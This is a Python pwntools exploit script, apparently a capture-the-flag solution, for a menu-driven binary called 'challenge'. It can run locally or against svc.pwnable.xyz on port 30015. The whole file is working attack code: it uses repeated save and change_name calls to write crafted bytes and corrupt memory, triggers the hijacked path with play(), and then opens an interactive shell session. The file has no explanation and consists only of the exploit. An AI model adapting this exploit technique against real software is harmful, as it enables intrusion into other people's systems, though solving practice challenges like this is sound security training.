from pwn import *
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def init(nm):
    r.sendlineafter(":",nm)

def play():
    r.sendlineafter(">","1")

def save(nm):
    r.sendlineafter(">","2")
    r.sendafter(":",nm)

def delete(nm):
    r.sendlineafter(">","3")
    r.sendlineafter(":",str(nm))

def print_name():
    r.sendlineafter(">","4")

def change_name(old,new):
    r.sendlineafter(">","5")
    r.sendlineafter(":",old)
    r.sendlineafter(":",new)

def exploit(r):
    # attach(r)
    
    init("A" * 8)
    save("B" * 128)
    
    save("X" * 128)

    change_name("a","a")
    change_name("b","a")
    change_name("c","a")
    change_name("d","a")

    change_name("\x6b","\xf3")
    change_name("\x0d","\x0c")
    change_name("\x40","\x40")
    
    play()


    r.interactive()


if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30015)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)